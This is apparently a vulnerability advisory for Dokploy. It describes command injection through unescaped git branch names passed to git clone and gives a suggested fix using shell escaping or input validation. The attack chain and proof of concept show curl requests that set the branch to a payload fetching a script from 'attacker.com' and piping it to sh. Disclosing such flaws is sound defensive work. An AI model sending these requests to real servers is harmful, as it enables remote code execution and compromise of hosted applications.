repo.description:
## Summary

Dokploy has a command injection vulnerability in its git provider implementation. The `--branch` argument to `git clone` is interpolated directly into shell command strings without any escaping, allowing an authenticated user to inject arbitrary OS commands by setting a malicious branch name and triggering a deployment.

The vulnerable pattern exists across all git provider files, but the branch field consistently uses `z.string().optional()` with no character restrictions. This vulnerability was previously reported as GHSA-3frc-cfh9-ch2c (CVE-2026-45628) but remains unfixed in the current codebase.

## Affected Versions

TODO: Confirm affected version range. Vulnerability present in current `main` branch.

## Vulnerability Details

### Root Cause: Unescaped branch name interpolation in git clone commands

The `--branch` argument is interpolated without escaping into shell command strings. For example, in `packages/server/src/utils/providers/github.ts` line 170:

```typescript
command += `git clone --branch ${branch} --depth 1 ${enableSubmodules ? "--recurse-submodules" : ""} ${cloneUrl} ${outputPath} --progress;`;
```

The branch field accepts arbitrary strings. Shell metacharacters such as `;`, `|`, `$()`, and backticks are interpreted by the shell when the command string is passed to `execAsync()`.

The same unescaped interpolation pattern exists across all other git provider files (`git.ts`, `gitlab.ts`, `bitbucket.ts`, `gitea.ts`).

The codebase has `shEscape()` in `packages/server/src/services/registry.ts` lines 14-17:

```typescript
function shEscape(s: string | undefined): string {
    if (!s) return "''";
    return `'${s.replace(/'/g, `'\\''`)}'`;
}
```

This function is not used in any of the git provider files.

### Attack Chain

- Attacker authenticates to Dokploy with project access
- Creates or updates an application via tRPC, setting the branch name to `main;curl attacker.com/x|sh;`
- Triggers a deployment
- Dokploy builds and executes: `git clone --branch main;curl attacker.com/x|sh; --depth 1 ...`
- The semicolons terminate the git command and execute the injected commands as the server user

## Proof of Concept

```bash
# Update application with injected branch name
curl -X POST "http://TARGET/api/trpc/application.update" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d '{
    "json": {
      "applicationId": "APP_ID",
      "sourceType": "github",
      "branch": "main;curl attacker.com/x|sh;"
    }
  }'

# Trigger deployment
curl -X POST "http://TARGET/api/trpc/application.deploy" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d '{"json": {"applicationId": "APP_ID"}}'

# The server executes:
#   git clone --branch main;curl attacker.com/x|sh; --depth 1 ...
# The semicolons terminate the git command and execute the injected commands.
```

## Impact

- Execute arbitrary OS commands as the Dokploy server process user (often root)
- Read/write any file on the host (private keys, database credentials, Docker socket)
- Pivot to other containers and services via the Docker socket
- Compromise all applications and databases managed by the Dokploy instance

## Suggested Remediation

Apply `shEscape()` to the branch name in the git provider files. For example, in `github.ts`:

```typescript
import { shEscape } from "../../services/registry";

// In the clone command:
command += `git clone --branch ${shEscape(branch)} --depth 1 ${enableSubmodules ? "--recurse-submodules" : ""} ${shEscape(cloneUrl)} ${shEscape(outputPath)} --progress;`;
```

The same fix should be applied across all provider files.

Alternatively, add Zod schema validation to reject shell metacharacters: `z.string().regex(/^[a-zA-Z0-9._\/-]+$/)`.
repo.summary: Command Injection via Unescaped Git Branch Names in All Providers
